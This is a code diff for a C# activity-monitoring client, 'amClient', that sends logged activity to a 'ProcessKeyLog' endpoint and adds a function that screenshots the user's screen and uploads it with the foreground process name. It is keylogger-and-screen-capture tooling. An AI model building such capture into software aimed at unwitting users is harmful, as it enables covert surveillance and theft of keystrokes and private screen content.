@@ -11,11 +11,14 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
+using System.Timers;
 
 namespace amClient
 {
     class Program
     {
+        private static bool running = false;
+
         private static string ACTIVITY_TYPE_APPLICATION = "Application";
         private static string ACTIVITY_TYPE_URL = "URL";
 
@@ -74,7 +77,18 @@ namespace amClient
 
             SubscribeGlobal();
 
-            Application.Run();
+            SendScreenCapture();
+            //System.Timers.Timer aTimer = new System.Timers.Timer();
+            //aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
+            //aTimer.Interval = int.MaxValue;
+            //aTimer.Enabled = true;
+
+            Application.Run();            
+        }
+
+        private static void OnTimedEvent(object sender, ElapsedEventArgs e)
+        {
+            SendScreenCapture();
         }
 
         private static string GetLocalHostPort()
@@ -165,9 +179,9 @@ namespace amClient
                 }
                 else
                 {
-                    if(monitoringList.Count > 0)
+                    if (monitoringList.Count > 0)
                     {
-                        CreateMonitoringAsync(monitoringList);
+                        SendMonitoringAsync(monitoringList);
                         monitoringList = new List<amModel>();
                     }
 
@@ -212,7 +226,7 @@ namespace amClient
                 {
                     if (monitoringList.Count > 0)
                     {
-                        CreateMonitoringAsync(monitoringList);
+                        SendMonitoringAsync(monitoringList);
                         monitoringList = new List<amModel>();
                     }
 
@@ -230,7 +244,7 @@ namespace amClient
             }
             catch (Exception ex)
             {
-
+                
             }
         }
 
@@ -256,12 +270,31 @@ namespace amClient
         //    return monitor;
         //}
 
-        static async Task<Uri> CreateMonitoringAsync(List<amModel> monitor)
+        static async Task<Uri> SendMonitoringAsync(List<amModel> monitor)
         {
-            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/Process", monitor);
+            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/ProcessKeyLog", monitor);
             response.EnsureSuccessStatusCode();
 
-            // Return the URI of the created resource.
+            return response.Headers.Location;
+        }
+
+        static async Task<Uri> SendScreenCapture()
+        {
+            Int32 hwnd = 0;
+            hwnd = GetForegroundWindow();
+            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
+            
+            var capture = new amCapture();
+            capture.amCaptureId = Guid.NewGuid().ToString();
+            capture.SessionID = 0;
+            capture.ActivityName = appProcessName;
+            capture.ImageBtyeArrayString = new ScreenCapture().CaptureScreenByteArrayString(System.Drawing.Imaging.ImageFormat.Jpeg);
+            capture.CaptureScreenDate = DateTime.Now;
+            capture.IsSuccessSendToServer = false;
+            
+            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/ProcessCaptureImage", capture);
+            response.EnsureSuccessStatusCode();
+
             return response.Headers.Location;
         }
 
